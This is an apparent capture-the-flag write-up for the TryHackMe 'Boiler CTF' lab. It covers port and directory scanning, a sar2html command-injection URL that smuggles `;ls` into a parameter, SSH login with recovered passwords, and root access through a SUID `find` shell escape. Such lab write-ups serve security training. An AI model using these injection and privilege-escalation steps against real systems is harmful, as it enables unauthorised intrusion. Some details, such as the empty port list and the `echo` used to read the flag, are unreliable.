# Writeup for THM room [Boiler CTF](https://tryhackme.com/room/boilerctf2)

```fish
set -gx IP 10.10.249.201
```

## Start enumeration with portscan

```fish
nmap -sN -sV -sC -oN nmap/init $IP
```

> Found open ports: ``

### Make a full port scan

```fish
nmap -sN -sV -sC -p- -oN nmap/all_ports $IP
```

### HTTP enumeration

```fish
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt
```

### HTTP enumeration 2

```fish
gobuster dir -u $IP/joomla -w /usr/share/wordlists/dirb/common.txt
```

Found on `http://10.10.249.201/joomla/_files/`: `VjJodmNITnBaU0JrWVdsemVRbz0K`

> Double base64 encoded: `Whopsie daisy`

> Found `http://10.10.249.201/joomla/_test/` mentioning sar2html

Googling fo sar2html exploit

> Found [this](https://www.exploit-db.com/exploits/47204)

Found `log.txt` with url: `http://10.10.249.201/joomla/_test/index.php?plot=;ls`

Users: `basterd` & `stoner`

> Password for user `basterd` found in log.txt

## Connect to ssh

```fish
ssh basterd@$IP -p 55007
```

List files in current folder

```fish
ls
cat backup.sh
```

> Found `backup.sh` and other password in it.

## Priviledge escalation

Search for SUID enabled files:

```bash
find / -perm /4000 2>/dev/null
```

> Found `/usr/bin/find`

Start escalation like desccribed [here](https://gtfobins.github.io/gtfobins/find/#suid):

```bash
find . -exec /bin/sh -p \; -quit
```

> Got root. Print root.txt

```bash
echo /root/root.txt
```
